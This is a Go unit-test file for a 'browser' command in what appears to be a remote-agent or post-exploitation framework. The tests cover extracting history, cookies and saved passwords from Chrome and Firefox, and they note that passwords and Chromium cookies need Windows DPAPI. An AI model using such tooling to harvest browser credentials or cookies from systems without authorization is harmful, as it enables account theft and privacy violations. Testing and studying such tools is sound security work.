//go:build !windows

package commands

import (
	"encoding/json"
	"runtime"
	"testing"
)

func TestBrowserCommandName(t *testing.T) {
	assertCommandName(t, &BrowserCommand{}, "browser")
}

func TestBrowserCommandDescription(t *testing.T) {
	assertCommandHasDescription(t, &BrowserCommand{})
}

func TestBrowserEmptyParams(t *testing.T) {
	cmd := &BrowserCommand{}
	result := cmd.Execute(mockTask("browser", ""))
	// Empty params defaults to history/all — should succeed (may find no browsers)
	assertSuccess(t, result)
}

func TestBrowserInvalidJSON(t *testing.T) {
	cmd := &BrowserCommand{}
	// Invalid JSON falls back to history/all defaults
	result := cmd.Execute(mockTask("browser", "not json"))
	assertSuccess(t, result)
}

func TestBrowserUnknownAction(t *testing.T) {
	cmd := &BrowserCommand{}
	params, _ := json.Marshal(browserArgs{Action: "invalid"})
	result := cmd.Execute(mockTask("browser", string(params)))
	assertError(t, result)
	assertOutputContains(t, result, "Unknown action")
}

func TestBrowserPasswordsUnsupported(t *testing.T) {
	cmd := &BrowserCommand{}
	params, _ := json.Marshal(browserArgs{Action: "passwords"})
	result := cmd.Execute(mockTask("browser", string(params)))
	assertError(t, result)
	assertOutputContains(t, result, "Windows")
}

func TestBrowserCookiesChromiumUnsupported(t *testing.T) {
	cmd := &BrowserCommand{}
	params, _ := json.Marshal(browserArgs{Action: "cookies", Browser: "chrome"})
	result := cmd.Execute(mockTask("browser", string(params)))
	assertError(t, result)
	assertOutputContains(t, result, "DPAPI")
}

func TestBrowserPaths(t *testing.T) {
	paths := browserPaths("all")
	if paths == nil {
		t.Fatal("browserPaths returned nil")
	}
	if runtime.GOOS == "darwin" || runtime.GOOS == "linux" {
		if _, ok := paths["Chrome"]; !ok {
			t.Error("browserPaths missing Chrome")
		}
		if _, ok := paths["Firefox"]; !ok {
			t.Error("browserPaths missing Firefox")
		}
	}
}

func TestBrowserPathsFiltered(t *testing.T) {
	paths := browserPaths("firefox")
	if paths == nil {
		t.Fatal("browserPaths returned nil")
	}
	if len(paths) != 1 {
		t.Errorf("expected 1 path for firefox, got %d", len(paths))
	}
	if _, ok := paths["Firefox"]; !ok {
		t.Error("browserPaths missing Firefox when filtered")
	}
}

func TestBrowserHistoryAction(t *testing.T) {
	cmd := &BrowserCommand{}
	params, _ := json.Marshal(browserArgs{Action: "history", Browser: "all"})
	result := cmd.Execute(mockTask("browser", string(params)))
	assertSuccess(t, result)
}
